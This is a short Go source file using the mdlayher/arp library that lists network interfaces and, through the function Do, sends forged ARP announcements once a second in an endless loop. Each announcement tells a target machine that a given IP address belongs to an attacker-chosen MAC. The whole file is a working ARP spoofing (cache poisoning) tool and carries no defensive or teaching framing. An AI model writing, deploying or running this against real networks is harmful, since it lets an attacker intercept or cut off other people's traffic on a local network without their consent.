package arp

import (
	"fmt"
	marp "github.com/mdlayher/arp"
	"net"
	"time"
)

var (
	writeTimeout, _ = time.ParseDuration("100ms")
)

func SendAnnounce(client *marp.Client,
	dstEther net.HardwareAddr, dstIP net.IP,
	hwAddr net.HardwareAddr) error {
	if packet, err := marp.NewPacket(marp.OperationRequest, hwAddr, dstIP, hwAddr, dstIP); err == nil {
		if err = client.SetWriteDeadline(time.Now().Add(writeTimeout)); err == nil {
			return client.WriteTo(packet, dstEther)
		} else {
			return err
		}
	} else {
		return err
	}
}

func Do(interfaceName string,
	targetMACString string,
	spoofedIPString string,
	spoofMACString string) error {
	if itf, err := net.InterfaceByName(interfaceName); err == nil {
		if client, err := marp.Dial(itf); err == nil {
			targetMAC, _ := net.ParseMAC(targetMACString)
			targetIP := net.ParseIP(spoofedIPString)
			spoofMAC, _ := net.ParseMAC(spoofMACString)

			for {
				fmt.Print(targetIP, " -> ", spoofMAC, ", err = ")
				err := SendAnnounce(client, targetMAC, targetIP, spoofMAC)
				fmt.Println(err)
				time.Sleep(time.Second)
			}
		} else {
			fmt.Println("ARP dial failed :", err)
			return err
		}
	} else {
		fmt.Println("Could not find interface", interfaceName, ":", err)
		return err
	}
}

func ListInterfaces() {
	interfaces, _ := net.Interfaces()
	for _, currentInterface := range interfaces {
		addressesList, _ := currentInterface.Addrs()
		fmt.Print("\"", currentInterface.Name, "\" with MAC ", currentInterface.HardwareAddr, " has IP addresses ")
		for _, address := range addressesList {
			fmt.Print(address, ", ")
		}
		fmt.Println()
	}
}
